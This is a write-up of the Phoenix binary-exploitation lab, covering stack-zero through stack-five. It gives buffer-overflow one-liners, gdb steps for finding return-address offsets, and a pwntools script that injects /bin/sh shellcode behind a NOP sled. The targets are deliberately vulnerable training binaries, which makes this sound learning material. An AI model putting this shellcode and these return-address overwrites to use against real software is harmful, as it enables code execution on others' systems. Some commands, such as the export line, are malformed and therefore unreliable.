# Phoenix: is basic binar exploitation challenge:

# Note: challenges are located in /opt/phoenix/amd64


## Stack0:
- gets take un check data which could be used to create the buffer over flow:

```
python -c 'print("A"*70)' | ./stack_zero

```

## Stack1:

- The challenge is similar to the above challenge but one has to look for following things:
  1- read the little-Endians -> which store data from large to smaller values, so after the overflow provide the variables value in reverse order
  2- In the code the user provided input is taken as the argument in the for of ``` char ***argv ``` which is then copied to the buffer of length 64 buffer[64]:
  
  ```
   strcpy(locals.buffer, argv[1]);
  ```
  
  ==Note==: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
  ```
  /stack-one $(python -c 'print("A" * 65 + "\x62\x59\x6c\x49")')
  
  ```
## Stack2:
- In this challenge code is using the envirnment variable with the name of ==ExploitateEducation== to be passed as the argument in the stack.
- so in order make the buffer overflow happen we will do :
```
export ExploitEducation = $(python -c 'print("A" * 65 + \x0a\x09\x0a\x0d)')

```
Simply run the function and we will have the over flow.

## stack3:

- In the stack three one has to first find the address of the complete_level function:
```
objdump -d ./stack-three | grep complete_level
000000000040069d <complete_level>:

```
```
0x40069d
python -c 'print "A" * 64 + "\x9d\x06\x40"' | ./stack-three
```

## stack4

- In this challenge the buffer ovflow occurs in the start_level funtions which is called in the main() function:

```

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}


```

- What we have to do is:
  1- overflow the stack buffer until it reach the return address of strart_level() function
  2- keep in mind all the functions returns addressess are saved on the stack.
  3- the return address of the start_level will also be present on the stack.
  
- How to find the write amount of characters to overflow the buffer:
  1- open the program in the gdb.
  2- place the breakpoint after the gets() function.
  3- fill the buffer with dummy data:
	  ```
	  run < <(python -c 'print("A" * 64)')
	  ```
  4- Now find the location of overflowed function:
	  ```
	  x/100x $rsp // rsp is the stack pointer it is the top most address of the stack
	  ```
  5- the above prompt will dump the address and data stored on the stack in form of hex.
  6- The top left address will mostly likely show the overflowed buffer.
  7- next step is to find the return address of start_level which could by find by:
	  ```
	  info frame // the <saved $rip=????> will be the return address of the start level function
	  ```
  8- To calculate the right amount of characters to reach the start_level return address one can subtract the address of overflowed buffer with the return address
  of the start_level function.
  
	  ```
	  0x7fffffffe4f8 - 0x7fffffffe4a0 = 0x58 
	  which in decimal is = 88
	  ```
  9- Now to curate a payload:
	  ```
	  python -c 'print("A" * 88 + "\x1d\x06\x40")' | ./stack-four
	  ```
## stack 5

- In this challenge one has to inject the the shell code which will return a /bin/sh shell $
- How to approach the problem:
  1- Inject the shellcode on the stack.
  2- change the return address and point it towards the shell code
  3- lastly the shell will execute.

- Procedure of Payload creation:
		1- first copy a shell code from the internet and convert it into little endian hex format:
   		```
	'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
	'\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'	
	```
		2- In the begining of the buffer according to your choice add the NOP -> No operation in the stack:
			```
		'\x90' * 30 // here hex for NOP is \x90 and 30 is number of times we want to insert it.
		```
		3- after adding the NOP now add the shellcode which is defined previously.
		4- The Purpose of NOP is to make the shell land where we want to land it and exclude any discrepancy which comes 
		in the way.
		5- keep in the view that total lenth of buffer is 128, of which we 30 has been defined for the NOP operators.
		6- after the NOP code and shellcode, add the buffer over flow script which is:
			```
		python -c 'print("A" * 98)' // we are multipling it with 98 because 30 are already allocated.
		```
		7- At last overwrite the value of RBP buffer to 8 bit digits as BBBBBBBB.
		8- open the executable in the gdb and set the break point after the gets() function in the 
		start_level function.
		9- then run the code as:
		```
		run < <(python payload.py)
		```
		10- open the info frame and see where is the start_level function will return after the excution:
		```
		gef> info frame
		Stack level 0, frame at 0x7fffffffe520:
		rip = 0x4005a1 in start_level; saved rip = 0x7fffffffe480
		called by frame at 0x7fffffffe528
		Arglist at 0x7fffffffe510, args: 
		Locals at 0x7fffffffe510, Previous frame's sp is 0x7fffffffe520
		Saved registers:
		rbp at 0x7fffffffe510, rip at 0x7fffffffe518

		```
			- here is the saved rip = 0x7fffffffe480 is where the start_level will return 
		11- Use the pwn tool 
	

		```
			from pwn import *
			import sys

		shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff' \
            '\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
		buff  = '\x90' * 30                 # NOP sled
		buff += shellcode                  # Shellcode
		buff += 'A' * (128 - len(buff))    # Padding to reach saved RBP
		buff += 'BBBBBBBB'                 # Fake RBP
		buff += p64(0x7fffffffe480)        # Overwritten RIP // execute the code and analyse the stack to see were your shellcode is starting and replace it with that.


		sys.stdout.write(buff)

		```

To run the code:
```
(python payload.py; cat) | /opt/phoenix/amd64/stack-five
```

